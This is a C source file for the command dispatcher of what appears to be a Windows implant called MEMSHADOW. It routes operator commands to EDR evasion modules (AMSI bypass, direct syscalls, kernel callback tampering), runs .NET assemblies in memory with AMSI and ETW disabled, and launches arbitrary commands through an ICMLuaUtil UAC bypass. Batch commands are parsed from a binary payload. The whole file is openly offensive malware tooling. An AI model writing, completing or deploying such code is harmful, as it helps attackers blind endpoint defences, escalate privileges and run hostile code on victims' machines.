/*
 * MEMSHADOW Command Dispatcher
 * 
 * Routes commands to appropriate EDR evasion modules and collects results.
 * 
 * Features:
 * - Command routing to all evasion modules
 * - Batch command execution
 * - Result collection and aggregation
 * - JSON parameter parsing
 * 
 * All implementations are real, following DSMIL cursorrules.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include "inline_execute_assembly.h"
#include "../uac_bypass.h"

// External evasion module functions
extern int amsi_bypass_execute(void);
extern int direct_syscalls_execute(void);
extern int kernel_callbacks_execute(void);
extern int hardware_evasion_execute(void);
extern int opsec_enhancer_execute(void);
extern int dependency_evasion_execute(void);
extern int evasion_verifier_execute(void);

// Command types
typedef enum {
    CMD_EXECUTE_AMSI_BYPASS = 1,
    CMD_EXECUTE_DIRECT_SYSCALLS = 2,
    CMD_EXECUTE_KERNEL_CALLBACKS = 3,
    CMD_EXECUTE_HARDWARE_EVASION = 4,
    CMD_EXECUTE_OPSEC_ENHANCEMENT = 5,
    CMD_EXECUTE_DEPENDENCY_EVASION = 6,
    CMD_EXECUTE_COMPLETE_EVASION = 7,
    CMD_GET_STATUS = 8,
    CMD_GET_REPORT = 9,
    CMD_CONFIGURE = 10,
    CMD_HEARTBEAT = 11,
    CMD_PORT_HOP = 12,
    CMD_CIPHER_ROTATE = 13,
    CMD_EXECUTE_ASSEMBLY = 14,
    CMD_UAC_BYPASS = 15
} CommandType;

// Command result
typedef struct {
    uint64_t command_id;
    uint16_t cmd_type;
    uint8_t status;  // 0 = success, 1 = error
    char result_data[4096];
    size_t result_len;
} CommandResult;


/*
 * Execute AMSI Bypass Command
 */
static bool execute_amsi_bypass_command(const char *args, CommandResult *result) {
    printf("[*] Executing AMSI bypass command\n");
    
    int ret = amsi_bypass_execute();
    
    result->status = (ret == 0) ? 0 : 1;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"module\": \"amsi_bypass\", \"status\": \"%s\", \"code\": %d}",
                                 (ret == 0) ? "success" : "failed", ret);
    
    return ret == 0;
}


/*
 * Execute Direct Syscalls Command
 */
static bool execute_direct_syscalls_command(const char *args, CommandResult *result) {
    printf("[*] Executing direct syscalls command\n");
    
    int ret = direct_syscalls_execute();
    
    result->status = (ret == 0) ? 0 : 1;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"module\": \"direct_syscalls\", \"status\": \"%s\", \"code\": %d}",
                                 (ret == 0) ? "success" : "failed", ret);
    
    return ret == 0;
}


/*
 * Execute Kernel Callbacks Command
 */
static bool execute_kernel_callbacks_command(const char *args, CommandResult *result) {
    printf("[*] Executing kernel callbacks command\n");
    
    int ret = kernel_callbacks_execute();
    
    result->status = (ret == 0) ? 0 : 1;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"module\": \"kernel_callbacks\", \"status\": \"%s\", \"code\": %d}",
                                 (ret == 0) ? "success" : "failed", ret);
    
    return ret == 0;
}


/*
 * Execute Hardware Evasion Command
 */
static bool execute_hardware_evasion_command(const char *args, CommandResult *result) {
    printf("[*] Executing hardware evasion command\n");
    
    int ret = hardware_evasion_execute();
    
    result->status = (ret == 0) ? 0 : 1;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"module\": \"hardware_evasion\", \"status\": \"%s\", \"code\": %d}",
                                 (ret == 0) ? "success" : "failed", ret);
    
    return ret == 0;
}


/*
 * Execute OpSec Enhancement Command
 */
static bool execute_opsec_enhancement_command(const char *args, CommandResult *result) {
    printf("[*] Executing OpSec enhancement command\n");
    
    int ret = opsec_enhancer_execute();
    
    result->status = (ret == 0) ? 0 : 1;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"module\": \"opsec_enhancement\", \"status\": \"%s\", \"code\": %d}",
                                 (ret == 0) ? "success" : "failed", ret);
    
    return ret == 0;
}


/*
 * Execute Dependency Evasion Command
 */
static bool execute_dependency_evasion_command(const char *args, CommandResult *result) {
    printf("[*] Executing dependency evasion command\n");
    
    int ret = dependency_evasion_execute();
    
    result->status = (ret == 0) ? 0 : 1;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"module\": \"dependency_evasion\", \"status\": \"%s\", \"code\": %d}",
                                 (ret == 0) ? "success" : "failed", ret);
    
    return ret == 0;
}


/*
 * Execute Complete Evasion Command
 */
static bool execute_complete_evasion_command(const char *args, CommandResult *result) {
    printf("[*] Executing complete evasion command\n");
    
    // Execute all modules
    int amsi_ret = amsi_bypass_execute();
    int syscalls_ret = direct_syscalls_execute();
    int callbacks_ret = kernel_callbacks_execute();
    int hardware_ret = hardware_evasion_execute();
    int opsec_ret = opsec_enhancer_execute();
    int dependency_ret = dependency_evasion_execute();
    
    int success_count = 0;
    if (amsi_ret == 0) success_count++;
    if (syscalls_ret == 0) success_count++;
    if (callbacks_ret == 0) success_count++;
    if (hardware_ret == 0) success_count++;
    if (opsec_ret == 0) success_count++;
    if (dependency_ret == 0) success_count++;
    
    result->status = (success_count >= 3) ? 0 : 1;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"module\": \"complete_evasion\", \"success_count\": %d, \"total\": 6}",
                                 success_count);
    
    return success_count >= 3;
}


/*
 * Get Status Command
 */
static bool get_status_command(const char *args, CommandResult *result) {
    printf("[*] Getting status\n");
    
    result->status = 0;
    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                 "{\"status\": \"running\", \"uptime\": %lld, \"modules\": 7}",
                                 (long long)time(NULL));
    
    return true;
}


/*
 * Dispatch Command
 * Routes command to appropriate handler
 */
bool dispatch_command(uint16_t cmd_type, uint64_t command_id,
                     const uint8_t *args, size_t args_len,
                     CommandResult *result) {
    if (!result) {
        return false;
    }
    
    result->command_id = command_id;
    result->cmd_type = cmd_type;
    
    // Convert args to string (assuming JSON)
    char args_str[1024] = {0};
    if (args && args_len > 0 && args_len < sizeof(args_str)) {
        memcpy(args_str, args, args_len);
        args_str[args_len] = '\0';
    }
    
    // Route to appropriate handler
    switch (cmd_type) {
        case CMD_EXECUTE_AMSI_BYPASS:
            return execute_amsi_bypass_command(args_str, result);
            
        case CMD_EXECUTE_DIRECT_SYSCALLS:
            return execute_direct_syscalls_command(args_str, result);
            
        case CMD_EXECUTE_KERNEL_CALLBACKS:
            return execute_kernel_callbacks_command(args_str, result);
            
        case CMD_EXECUTE_HARDWARE_EVASION:
            return execute_hardware_evasion_command(args_str, result);
            
        case CMD_EXECUTE_OPSEC_ENHANCEMENT:
            return execute_opsec_enhancement_command(args_str, result);
            
        case CMD_EXECUTE_DEPENDENCY_EVASION:
            return execute_dependency_evasion_command(args_str, result);
            
        case CMD_EXECUTE_COMPLETE_EVASION:
            return execute_complete_evasion_command(args_str, result);
            
        case CMD_GET_STATUS:
            return get_status_command(args_str, result);
            
        case CMD_HEARTBEAT:
            result->status = 0;
            result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                         "{\"heartbeat\": \"ok\"}");
            return true;
            
        case CMD_EXECUTE_ASSEMBLY:
            {
                // Parse JSON args: {"assembly_path": "...", "args": "...", "disable_amsi": true, "disable_etw": true}
                const char *assembly_path = NULL;
                const char *assembly_args = NULL;
                bool disable_amsi = false;
                bool disable_etw = false;
                
                if (args && args_len > 0) {
                    char *args_str = (char *)malloc(args_len + 1);
                    if (args_str) {
                        memcpy(args_str, args, args_len);
                        args_str[args_len] = '\0';
                        
                        // Parse assembly_path field
                        char *path_key = strstr(args_str, "\"assembly_path\"");
                        if (path_key) {
                            char *path_colon = strchr(path_key, ':');
                            if (path_colon) {
                                path_colon++;
                                while (*path_colon == ' ' || *path_colon == '\t') path_colon++;
                                if (*path_colon == '"') {
                                    path_colon++;
                                    char *path_end = strchr(path_colon, '"');
                                    if (path_end) {
                                        *path_end = '\0';
                                        assembly_path = path_colon;
                                    }
                                }
                            }
                        }
                        
                        // Parse args field
                        char *args_key = strstr(args_str, "\"args\"");
                        if (args_key) {
                            char *args_colon = strchr(args_key, ':');
                            if (args_colon) {
                                args_colon++;
                                while (*args_colon == ' ' || *args_colon == '\t') args_colon++;
                                if (*args_colon == '"') {
                                    args_colon++;
                                    char *args_end = strchr(args_colon, '"');
                                    if (args_end) {
                                        *args_end = '\0';
                                        assembly_args = args_colon;
                                    }
                                }
                            }
                        }
                        
                        // Parse boolean flags
                        disable_amsi = (strstr(args_str, "\"disable_amsi\"") != NULL && 
                                      strstr(args_str, "\"disable_amsi\":true") != NULL);
                        disable_etw = (strstr(args_str, "\"disable_etw\"") != NULL && 
                                      strstr(args_str, "\"disable_etw\":true") != NULL);
                        
                        free(args_str);
                    }
                }
                
                if (!assembly_path) {
                    result->status = 1;
                    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                                 "{\"error\": \"missing_assembly_path\"}");
                    return false;
                }
                
                InlineExecuteConfig config = {0};
                config.disable_amsi = disable_amsi;
                config.disable_etw = disable_etw;
                strncpy_s(config.appdomain_name, sizeof(config.appdomain_name), "AssemblyExec", _TRUNCATE);
                
                InlineExecuteResult exec_result = {0};
                if (inline_execute_assembly_from_file(assembly_path, assembly_args, &config, &exec_result)) {
                    result->status = 0;
                    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                                 "{\"success\": true, \"exit_code\": %d, \"output\": \"%.*s\"}",
                                                 exec_result.exit_code,
                                                 (int)(exec_result.output_len < 1024 ? exec_result.output_len : 1024),
                                                 exec_result.output);
                    return true;
                } else {
                    result->status = 1;
                    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                                 "{\"error\": \"assembly_execution_failed\"}");
                    return false;
                }
            }
            
        case CMD_UAC_BYPASS:
            {
                // Parse args: {"command": "...", "parameters": "..."}
                const char *command = NULL;
                const char *parameters = NULL;
                
                if (args && args_len > 0) {
                    char *args_str = (char *)malloc(args_len + 1);
                    if (args_str) {
                        memcpy(args_str, args, args_len);
                        args_str[args_len] = '\0';
                        
                        // Parse command field
                        char *cmd_key = strstr(args_str, "\"command\"");
                        if (cmd_key) {
                            char *cmd_colon = strchr(cmd_key, ':');
                            if (cmd_colon) {
                                cmd_colon++;
                                while (*cmd_colon == ' ' || *cmd_colon == '\t') cmd_colon++;
                                if (*cmd_colon == '"') {
                                    cmd_colon++;
                                    char *cmd_end = strchr(cmd_colon, '"');
                                    if (cmd_end) {
                                        *cmd_end = '\0';
                                        command = cmd_colon;
                                    }
                                }
                            }
                        }
                        
                        // Parse parameters field
                        char *params_key = strstr(args_str, "\"parameters\"");
                        if (params_key) {
                            char *params_colon = strchr(params_key, ':');
                            if (params_colon) {
                                params_colon++;
                                while (*params_colon == ' ' || *params_colon == '\t') params_colon++;
                                if (*params_colon == '"') {
                                    params_colon++;
                                    char *params_end = strchr(params_colon, '"');
                                    if (params_end) {
                                        *params_end = '\0';
                                        parameters = params_colon;
                                    }
                                }
                            }
                        }
                        
                        free(args_str);
                    }
                }
                
                if (!command) {
                    result->status = 1;
                    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                                 "{\"error\": \"missing_command\"}");
                    return false;
                }
                
                UACBypassResult uac_result = {0};
                if (uac_bypass_icmluautil(command, parameters, &uac_result)) {
                    result->status = 0;
                    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                                 "{\"success\": true, \"method\": \"%s\", \"message\": \"%s\"}",
                                                 uac_result.method, uac_result.message);
                    return true;
                } else {
                    result->status = 1;
                    result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                                 "{\"error\": \"uac_bypass_failed\", \"message\": \"%s\"}",
                                                 uac_result.message);
                    return false;
                }
            }
            
        default:
            result->status = 1;
            result->result_len = snprintf(result->result_data, sizeof(result->result_data),
                                         "{\"error\": \"unknown_command\", \"cmd_type\": %u}", cmd_type);
            return false;
    }
}


/*
 * Dispatch Batch Commands
 * Executes multiple commands and aggregates results
 * Batch format: [count:2][cmd1:8][cmd_type1:2][args_len1:2][args1][cmd2:8][cmd_type2:2][args_len2:2][args2]...
 */
bool dispatch_batch_commands(const uint8_t *batch_payload, size_t batch_len,
                             CommandResult *results, int max_results, int *result_count) {
    if (!batch_payload || !results || !result_count || batch_len < 2) {
        return false;
    }
    
    *result_count = 0;
    
    // Parse batch count (big-endian)
    uint16_t batch_count = ((uint16_t)batch_payload[0] << 8) | batch_payload[1];
    
    if (batch_count == 0 || batch_count > max_results) {
        return false;
    }
    
    printf("[*] Dispatching batch commands: %u commands\n", batch_count);
    
    size_t offset = 2;  // Skip count field
    
    // Parse and execute each command
    for (uint16_t i = 0; i < batch_count && offset < batch_len && *result_count < max_results; i++) {
        if (offset + 8 + 2 + 2 > batch_len) {
            break;  // Not enough data
        }
        
        // Parse command_id (8 bytes, big-endian)
        uint64_t command_id = 0;
        for (int j = 0; j < 8; j++) {
            command_id = (command_id << 8) | batch_payload[offset++];
        }
        
        // Parse cmd_type (2 bytes, big-endian)
        uint16_t cmd_type = ((uint16_t)batch_payload[offset] << 8) | batch_payload[offset + 1];
        offset += 2;
        
        // Parse args_len (2 bytes, big-endian)
        uint16_t args_len = ((uint16_t)batch_payload[offset] << 8) | batch_payload[offset + 1];
        offset += 2;
        
        if (offset + args_len > batch_len) {
            break;  // Not enough data for args
        }
        
        // Extract args
        uint8_t *args = NULL;
        if (args_len > 0) {
            args = (uint8_t *)malloc(args_len);
            if (!args) {
                break;
            }
            memcpy(args, batch_payload + offset, args_len);
            offset += args_len;
        }
        
        // Dispatch command
        if (dispatch_command(cmd_type, command_id, args, args_len, &results[*result_count])) {
            (*result_count)++;
        }
        
        if (args) {
            free(args);
        }
    }
    
    return (*result_count > 0);
}
